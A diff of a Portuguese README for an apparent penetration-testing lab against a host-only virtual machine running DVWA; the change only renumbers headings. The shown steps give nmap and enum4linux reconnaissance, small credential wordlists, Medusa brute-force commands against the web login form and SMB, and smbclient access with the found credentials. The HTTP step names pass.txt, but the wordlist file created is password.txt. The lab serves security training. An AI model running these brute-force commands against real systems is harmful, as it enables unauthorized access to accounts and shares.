@@ -30,23 +30,23 @@ Projeto prático desenvolvido para simulação completa de um teste de seguranç
 * Selecione:
   * Modo: Host-Only Adapter
 
-### 1. Reconhecimento de Portas (Nmap)
+### 3. Reconhecimento de Portas (Nmap)
 Varredura inicial para identificar os serviços e portas abertas na máquina alvo:
 ```bash
 nmap -sV 192.168.56.102
 ```
-### 2. Enumeração do Sistema (Enum4linux)
+### 4. Enumeração do Sistema (Enum4linux)
 Recolha avançada de informações sobre o sistema operativo, utilizadores e partilhas SMB disponíveis na rede:
 ```bash
 enum4linux -A 192.168.56.102 | tee results.txt
 ```
-### 3. Criação de Wordlists
+### 5. Criação de Wordlists
 Configuração dos ficheiros de texto contendo as combinações de utilizadores e palavras-passe para os testes:
 ```bash
 echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
 echo -e "123456\npassword\nadmin\nmsfadmin\nuser" > password.txt
 ```
-### 4. Força Bruta na Aplicação Web
+### 6. Força Bruta na Aplicação Web
 Execução do ataque de força bruta direcionado ao formulário de autenticação do DVWA utilizando o módulo HTTP do Medusa:
 ```bash
 medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
@@ -54,13 +54,13 @@ medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
 -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
 -m 'FAIL=Login failed' -t 6
 ```
-### 5. Força Bruta no Serviço SMB
+### 7. Força Bruta no Serviço SMB
 Utilização das mesmas wordlists para efetuar um ataque de força bruta direcionado ao serviço SMB (compartilhamento/workgroup):
 Bash
 ```bash
 medusa -h 192.168.56.102 -U users.txt -P password.txt -M smb
 ```
-### 6. Acesso Remoto via SMB
+### 8. Acesso Remoto via SMB
 Utilização das credenciais válidas identificadas para aceder aos recursos partilhados do servidor alvo:
 ```bash
 smbclient //192.168.56.102/tmp -U msfadmin
